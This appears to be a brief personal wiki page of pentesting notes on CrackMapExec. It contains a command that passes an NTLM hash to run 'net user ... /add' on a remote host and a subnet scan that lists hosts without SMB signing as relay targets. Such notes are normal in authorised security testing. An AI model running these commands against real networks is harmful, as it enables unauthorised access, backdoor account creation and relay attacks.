<!-- TITLE: Crackmapexec -->
<!-- SUBTITLE: A quick summary of Crackmapexec -->


# Wishes
I wish that this could take advantage of a relayed connection ie instead of -H have a -R option that can do a relay (like an ad hoc ntlmrelay attack).  Although... cme doesn't seem to do much ntlmrelayx can't do... perhaps I should have just had ntlmrelayx run the commands.  Again (like so many tools, would like granular control.

# Common CME Runs
## How to execute commands
```text
./crackmapexec.py smb 192.168.10.25 -d . -u compromiseduser -H aad3LMPORTION04eeaad3b435b51404ee:729bb174dNTLMPORTION2f6cd816f377 -x 'net user summit ae2rpw4U!! /add'  
```

## Find Hosts that don't require signing
```
crackmapexec.py smb 192.168.10.0/24 --gen-relay-list targets2
```

